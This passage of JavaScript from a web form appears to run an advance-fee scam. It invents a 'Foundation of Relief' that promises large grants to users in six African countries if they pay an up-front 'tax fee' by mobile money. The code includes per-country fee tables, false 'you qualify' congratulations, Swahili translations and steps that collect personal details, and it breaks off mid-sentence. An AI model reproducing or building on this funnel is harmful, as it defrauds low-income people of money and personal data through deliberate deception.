
        // Data configurations for Packages across countries
        const packages = {
            Zambia: {
                currency: "ZMW",
                note: "NB: 9, 10, 11 and 12 is credited to your BANK ACCOUNT.",
                options: [
                    {val: "15000_399", text: "To get ZMW 15,000 - fee is ZMW 399", grant: "15,000", fee: "399"},
                    {val: "18000_599", text: "To get ZMW 18,000 - fee is ZMW 599", grant: "18,000", fee: "599"},
                    {val: "23000_999", text: "To get ZMW 23,000 - fee is ZMW 999", grant: "23,000", fee: "999"},
                    {val: "35000_1999", text: "To get ZMW 35,000 - fee is ZMW 1,999", grant: "35,000", fee: "1,999"},
                    {val: "42000_2299", text: "To get ZMW 42,000 - fee is ZMW 2,299", grant: "42,000", fee: "2,299"},
                    {val: "50000_2699", text: "To get ZMW 50,000 - fee is ZMW 2,699", grant: "50,000", fee: "2,699"},
                    {val: "58000_3299", text: "To get ZMW 58,000 - fee is ZMW 3,299", grant: "58,000", fee: "3,299"},
                    {val: "68000_3999", text: "To get ZMW 68,000 - fee is ZMW 3,999", grant: "68,000", fee: "3,999"},
                    {val: "74000_4499", text: "To get ZMW 74,000 - fee is ZMW 4,499", grant: "74,000", fee: "4,499"},
                    {val: "82000_5299", text: "To get ZMW 82,000 - fee is ZMW 5,299", grant: "82,000", fee: "5,299"},
                    {val: "92000_5999", text: "To get ZMW 92,000 - fee is ZMW 5,999", grant: "92,000", fee: "5,999"},
                    {val: "100000_6499", text: "To get ZMW 100,000 - fee is ZMW 6,499", grant: "100,000", fee: "6,499"}
                ],
                lines: ["MTN", "AIRTEL", "Other"]
            },
            Uganda: {
                currency: "Ugx",
                note: "Which grants are you capable of paying its tax fee?",
                options: [
                    {val: "3599000_100950", text: "1. Ugx.3,599,000 .fee. Ugx.100,950", grant: "3,599,000", fee: "100,950"},
                    {val: "4100000_205999", text: "2. Ugx.4,100,000 .fee. Ugx.205,999", grant: "4,100,000", fee: "205,999"},
                    {val: "6000000_310999", text: "3. Ugx.6,000,000 .fee. Ugx.310,999", grant: "6,000,000", fee: "310,999"},
                    {val: "8237000_410999", text: "4. Ugx.8,237,000 .fee. Ugx.410,999", grant: "8,237,000", fee: "410,999"},
                    {val: "10237000_500999", text: "5. Ugx.10,237,000 .fee. Ugx.500,999", grant: "10,237,000", fee: "500,999"},
                    {val: "12237000_810000", text: "6. Ugx.12,237,000 .fee. Ugx.810,000", grant: "12,237,000", fee: "810,000"},
                    {val: "14700000_999000", text: "7. Ugx.14,700,000 .fee. Ugx.999,000", grant: "14,700,000", fee: "999,000"},
                    {val: "16800000_1500099", text: "8. Ugx.16,800,000 .fee. Ugx.1,500,999", grant: "16,800,000", fee: "1,500,999"}
                ],
                lines: ["MTN", "AIRTEL", "Other"]
            },
            SouthSudan: {
                currency: "SSP",
                note: "Which of the awards below are you capable of paying its tax fee?",
                options: [
                    {val: "1690000_300000", text: "1. Fee SSP 300,000 to get SSP 1,690,000", grant: "1,690,000", fee: "300,000"},
                    {val: "2100000_400000", text: "2. Fee SSP 400,000 to get SSP 2,100,000", grant: "2,100,000", fee: "400,000"},
                    {val: "4273030_500000", text: "3. Fee SSP 500,000 to get SSP 4,273,030", grant: "4,273,030", fee: "500,000"},
                    {val: "5524220_600000", text: "4. Fee SSP 600,000 to get SSP 5,524,220", grant: "5,524,220", fee: "600,000"},
                    {val: "8654400_700000", text: "5. Fee SSP 700,000 to get SSP 8,654,400", grant: "8,654,400", fee: "700,000"},
                    {val: "10000000_800000", text: "6. Fee SSP 800,000 to get SSP 10,000,000", grant: "10,000,000", fee: "800,000"}
                ],
                lines: ["M-pesa shop", "Dahabshil", "Mobile money transfer", "M📱Gurush", "Other"],
                subtext: "Is there any of these nearby you..."
            },
            Cameroon: {
                currency: "XAF",
                note: "International Foundation of Relief Fund: Grant Categories and revenue Fees",
                options: [
                    {val: "550000_15000", text: "1. 15,000 XAF fee for 550,000 XAF Grant", grant: "550,000", fee: "15,000"},
                    {val: "750000_20000", text: "2. 20,000 XAF fee for 750,000 XAF Grant", grant: "750,000", fee: "20,000"},
                    {val: "950000_40000", text: "3. 40,000 XAF fee for 950,000 XAF Grant", grant: "950,000", fee: "40,000"},
                    {val: "1000000_50000", text: "4. 50,000 XAF fee for 1,000,000 XAF Grant", grant: "1,000,000", fee: "50,000"},
                    {val: "1150000_60000", text: "5. 60,000 XAF fee for 1,150,000 XAF Grant", grant: "1,150,000", fee: "60,000"},
                    {val: "1750000_65000", text: "6. 65,000 XAF fee for 1,750,000 XAF Grant", grant: "1,750,000", fee: "65,000"},
                    {val: "2050000_70000", text: "7. 70,000 XAF fee for 2,050,000 XAF Grant", grant: "2,050,000", fee: "70,000"},
                    {val: "3500000_80000", text: "8. 80,000 XAF fee for 3,500,000 XAF Grant", grant: "3,500,000", fee: "80,000"},
                    {val: "3900000_90000", text: "9. 90,000 XAF fee for 3,900,000 XAF Grant", grant: "3,900,000", fee: "90,000"},
                    {val: "4050000_100000", text: "10. 100,000 XAF fee for 4,050,000 XAF Grant", grant: "4,050,000", fee: "100,000"},
                    {val: "4750000_110000", text: "11. 110,000 XAF fee for 4,750,000 XAF Grant", grant: "4,750,000", fee: "110,000"},
                    {val: "5500000_120000", text: "12. 120,000 XAF fee for 5,500,000 XAF Grant", grant: "5,500,000", fee: "120,000"}
                ],
                lines: ["MTN Mobile Money", "Orange Money", "Other"]
            },
            Kenya: {
                currency: "KSH",
                note: "N/B: IF YOU WISH TO ACTIVATE SELECT YOUR LIMIT FOR SATISFACTION ✅",
                options: [
                    {val: "65000_1590", text: "65,000/- tax fee...is Ksh1,590", grant: "65,000", fee: "1,590"},
                    {val: "95000_1990", text: "95,000/- tax fee...IS KSH1,990", grant: "95,000", fee: "1,990"},
                    {val: "125000_2990", text: "125,000/- tax fee.. IS KSH2,990", grant: "125,000", fee: "2,990"},
                    {val: "150000_3990", text: "150,000/- tax fee..IS KSH3,990", grant: "150,000", fee: "3,990"},
                    {val: "175000_4990", text: "175,000/- tax fee...IS KSH4,990", grant: "175,000", fee: "4,990"},
                    {val: "200000_5990", text: "200,000/- tax fee...IS KSH5,990", grant: "200,000", fee: "5,990"},
                    {val: "250000_6990", text: "250,000/- tax fee..IS KSH6,990", grant: "250,000", fee: "6,990"},
                    {val: "300000_7990", text: "300,000/-tax fee..IS KSH7,990", grant: "300,000", fee: "7,990"},
                    {val: "350000_8990", text: "350,000/-tax fee..IS KSH8,990", grant: "350,000", fee: "8,990"},
                    {val: "400000_9990", text: "400,000/-tax fee..IS KSH9,990", grant: "400,000", fee: "9,990"},
                    {val: "450000_10990", text: "450,000/-tax fee..IS KSH10,990", grant: "450,000", fee: "10,990"},
                    {val: "500000_11990", text: "500,000/-tax fee..IS KSH11,990", grant: "500,000", fee: "11,990"},
                    {val: "550000_12990", text: "550,000/-tax fee..IS KSH12,990", grant: "550,000", fee: "12,990"},
                    {val: "600000_13990", text: "600,000/-.tax fee.IS KSH13,990", grant: "600,000", fee: "13,990"},
                    {val: "650000_14990", text: "650,000/-.tax fee.IS KSH14,990", grant: "650,000", fee: "14,990"},
                    {val: "750000_15990", text: "750,000/tax fee...IS KSH15,990", grant: "750,000", fee: "15,990"},
                    {val: "800000_16990", text: "800,000/-.tax fee.IS KSH16,990", grant: "800,000", fee: "16,990"},
                    {val: "850000_17990", text: "850,000/-.tax fee.IS KSH17,990", grant: "850,000", fee: "17,990"},
                    {val: "900000_18990", text: "900,000/-tax fee..IS KSH18,990", grant: "900,000", fee: "18,990"},
                    {val: "950000_19990", text: "950,000/-tax fee..IS KSH19,990", grant: "950,000", fee: "19,990"},
                    {val: "1000000_20990", text: "1,000,000/-tax fee..IS KSH20,990", grant: "1,000,000", fee: "20,990"}
                ],
                lines: ["M-PESA", "Airtel Money", "T-Kash", "Other"]
            },
            Tanzania: {
                currency: "TSH",
                note: "Chagua kiwango unachokihitaji kwa usahihi",
                options: [
                    {val: "2464000_55000", text: "1. 2,464,000/- ada..ni Tsh.55,000", grant: "2,464,000", fee: "55,000"},
                    {val: "4464000_85000", text: "2. 4,464,000/- ada..ni TSH. 85,000", grant: "4,464,000", fee: "85,000"},
                    {val: "6464000_115000", text: "3. 6,464,000/- ada ni TSH..115,000", grant: "6464,000", fee: "115,000"},
                    {val: "8464000_135000", text: "4. 8,464,000/- ada..ni TSH 135,000", grant: "8,464,000", fee: "135,000"},
                    {val: "10464000_155000", text: "5. 10,464,000/- ada..ni TSH155,000", grant: "10,464,000", fee: "155,000"},
                    {val: "12464000_195000", text: "6. 12,464,000/.ada..ni TSH195,000", grant: "12,464,000", fee: "195,000"}
                ],
                lines: ["Tigo Pesa", "Airtel Money", "Vodacom M-Pesa", "Nyingine"]
            }
        };

        // Switch General Questions Language to Swahili if Tanzania is picked
        function handleCountryChange() {
            const country = document.getElementById('country').value;
            
            if (country === "Tanzania") {
                // Swahili Version Translation mapping
                document.getElementById('q2-text').innerText = "📌 Salamu. Asante kwa kuwasiliana na  FOUNDATION OF RELIEF funds (FOR). Mipango yetu inafadhiliwa na michango ya hiari kutoka kwa serikali, taasisi, sekta binafsi na watu binafsi ili kuhakikisha tunakidhi mahitaji ya kila mtu mwenye kipato cha chini. Je, uko tayari kujibu maswali machache kabla ya kupokea Fedha zetu?";
                document.querySelectorAll('.opt-yes').forEach(el => el.innerText = "Ndiyo");
                document.querySelectorAll('.opt-no').forEach(el => el.innerText = "Hapana");

                document.getElementById('q3-text').innerText = "📌 Ulipata wapi taarifa kuhusu FOUNDATION OF RELIEF FUNDS?";
                document.getElementById('q3-options').children[0].querySelector('span').innerText = "1: MAPENDEKEZO BINAFSI";
                document.getElementById('q3-options').children[1].querySelector('span').innerText = "2: MTANDAO WA KIJAMII";
                document.getElementById('q3-options').children[2].querySelector('span').innerText = "3: UTANGAZAJI WA HABARI";
                document.getElementById('q3-options').children[3].querySelector('span').innerText = "4 NYINGINE";

                document.getElementById('q4-text').innerText = "📌 Je, ni mara yako ya kwanza kushiriki katika FOUNDATION RELIEF FUNDING PROGRAM?";
                
                document.getElementById('q5-text').innerText = "📌 Kuhusiana na FEDHA zetu za FOUNDATION OF RELIEF , unakusudia kufanya nini nazo?";
                document.querySelector('.opt-i1').innerText = "1. UWEKEZAJI";
                document.querySelector('.opt-i2').innerText = "2. GHARAMA ZA HARAKA / DHARURA";
                document.querySelector('.opt-i3').innerText = "3. KULIPA MADENI";
                document.querySelector('.opt-i4').innerText = "4. ADA YA SHULE";
                document.querySelector('.opt-i5').innerText = "5. BIASHARA";
                document.querySelector('.opt-i6').innerText = "6. Nyingine";

                document.getElementById('q6-text').innerText = "📌 Kazi yako ni nini?";
                document.getElementById('q6-select-prompt').innerText = "-- Chagua Kazi Yako --";

                document.getElementById('q7-text').innerText = "📌 Ahsante kwa majibu yako ✅ Tafadhali thibitisha maelezo yako kama ifuatavyo:";
                document.getElementById('lbl-referred').innerText = "Nani aliyekuelekeza hapa? (Sio lazima)";
            } else {
                // Reset to Default English Context Rules
                document.getElementById('q2-text').innerText = "📌Greetings,Thank you for contacting the Foundation of Relief (FOR).Supported by governments, institutions, and individual donors globally, our mission is to provide essential financial relief to either employed or non-employed and underserved populations. Please note that all grants are subject to standard revenue and tax compliance requirements.Sincerely,The Foundation of Relief (FOR) Team.Are you ready to proceed with a few brief questions regarding your application?"
                document.querySelectorAll('.opt-yes').forEach(el => el.innerText = "Yes");
                document.querySelectorAll('.opt-no').forEach(el => el.innerText = "No");

                document.getElementById('q3-text').innerText = "📌 Where did you hear about the FOUNDATION OF RELIEF FUNDS?";
                document.getElementById('q3-options').children[0].querySelector('span').innerText = "1: PERSONAL RECOMMENDATION";
                document.getElementById('q3-options').children[1].querySelector('span').innerText = "2: SOCIAL NETWORK";
                document.getElementById('q3-options').children[2].querySelector('span').innerText = "3: BROADCASTING OF NEWS";
                document.getElementById('q3-options').children[3].querySelector('span').innerText = "4 OTHER";

                document.getElementById('q4-text').innerText = "📌 Is it your first time you are participating in FOUNDATION OF RELIEF FUNDING PROGRAM?";

                document.getElementById('q5-text').innerText = "📌 Regarding our FOUNDATION OF RELIEF FUNDS PROGRAM, what do you intend to do with the funds?";
                document.querySelector('.opt-i1').innerText = "1. INVESTMENT";
                document.querySelector('.opt-i2').innerText = "2. COVER EMERGENCY EXPENSES";
                document.querySelector('.opt-i3').innerText = "3. CONSOLIDATE DEBT";
                document.querySelector('.opt-i4').innerText = "4. SCHOOL FEES";
                document.querySelector('.opt-i5').innerText = "5. BUSINESS";
                document.querySelector('.opt-i6').innerText = "6. Other";

                document.getElementById('q6-text').innerText = "📌 What is your occupation?";
                document.getElementById('q6-select-prompt').innerText = "-- Select Occupation --";

                document.getElementById('q7-text').innerText = "📌 Thanks for your answers ✅ Please verify your details as follows:";
                document.getElementById('lbl-referred').innerText = "Who referred you?(Optional)";
            }
        }

        // Validate structure step management engine
        function nextStep(currentStepNum) {
            const currentStepEl = document.getElementById(`step${currentStepNum}`);
            const requiredInputs = currentStepEl.querySelectorAll('input[required], select[required]');
            
            // Check HTML5 Validations
            for (let input of requiredInputs) {
                if (input.type === 'radio') {
                    const name = input.name;
                    const checked = currentStepEl.querySelector(`input[name="${name}"]:checked`);
                    if (!checked) {
                        alert("Please select an option to continue / Tafadhali chagua jibu moja kuendelea.");
                        return;
                    }
                } else if (!input.value) {
                    alert("Please fill in or select the required field / Tafadhali jaza nafasi iliyoachwa wazi.");
                    return;
                }
            }

            // Move onwards smoothly
            currentStepEl.classList.remove('active');
            document.getElementById(`step${currentStepNum + 1}`).classList.add('active');
        }

        // Dynamically setup regional package views 
        function setupCountryPackageStep() {
            // First run step 7 profile entries validation 
            const currentStepEl = document.getElementById('step7');
            const inputs = currentStepEl.querySelectorAll('input');
            for(let i of inputs) {
                if(!i.value) { alert("Please complete your personal information details."); return; }
            }

            const country = document.getElementById('country').value;
            const targetPackage = packages[country];
            
            // Build dynamic dropdown elements
            const dropdown = document.getElementById('package-dropdown');
            dropdown.innerHTML = `<option value="" disabled selected>${country === 'Tanzania' ? '-- Chagua Kifurushi --' : '-- Choose Package --'}</option>`;
            
            targetPackage.options.forEach(opt => {
                dropdown.innerHTML += `<option value="${opt.val}" data-grant="${opt.grant}" data-fee="${opt.fee}">${opt.text}</option>`;
            });

            if (country === 'Tanzania') {
                document.getElementById('package-title').innerText = "Je, ni Pesa zipi za Michango unaweza kulipa ada yake ya kuwezesha?";
            } else if (country === 'Uganda') {
                document.getElementById('package-title').innerText = "✔️ CONGRATULATIONS you Qualify 💥☑️✅ Which grants are you capable of paying its tax fee?";
            } else if (country === 'SouthSudan') {
                document.getElementById('package-title').innerText = "Congratulations you Qualify 💥☑️ Which of the awards below are you capable of paying its tax fee?";
            } else {
                document.getElementById('package-title').innerText = "🎊 Thank you for choosing grants from FOUNDATION OF RELIEF FUNDING agency Award Enterprises. Select your Choice:";
            }
            
            document.getElementById('package-note').innerText = targetPackage.note;

            currentStepEl.classList.remove('active');
            document.getElementById('step8').classList.add('active');
        }

        // Hook setup before Confirmation view logic triggered
        document.getElementById('package-dropdown').addEventListener('change', function() {
            const selectedOpt = this.options[this.selectedIndex];
            const grant = selectedOpt.getAttribute('data-grant');
            const fee = selectedOpt.getAttribute('data-fee');
            const country = document.getElementById('country').value;
            const currency = packages[country].currency;

            const congratsBox = document.getElementById('congrats-text');

            if(country === 'Tanzania') {
                congratsBox.innerHTML = `💥 <strong>Hongera</strong>, unastahili kupokea <strong>${currency} ${grant}</strong>.<br><br>Fedha hizi ni kutoka kwa Wakfu wa FOUNDATION OF RELIEF kusaidia watu wetu ambao lazima wanaopokea mapato ya chini. Mipango yetu inafadhiliwa na wafadhili binafsi, wakfu, biashara na taasisi. Tunatumai unafahamu kuwa ingekugharimu ada ya ushuru ya <strong>${currency}. ${fee}</strong> ili maelezo yako yaandikwe kwenye mfumo wetu. Hii ni malipo ya mapema kila wakati. Tujulishe ukiwa tayari ili tuendelee.`;
                document.getElementById('lbl-ready').innerText = "1. TAYARI";
                document.getElementById('lbl-notready').innerText = "2. SIO TAYARI";
            } else {
                congratsBox.innerHTML = `☑️ <strong>Congratulations</strong>, you're eligible to receive <strong>${currency} ${grant}</strong>.<br><br>These funds are from FOUNDATION OF RELIEF its headquarter is in Switzerland to help
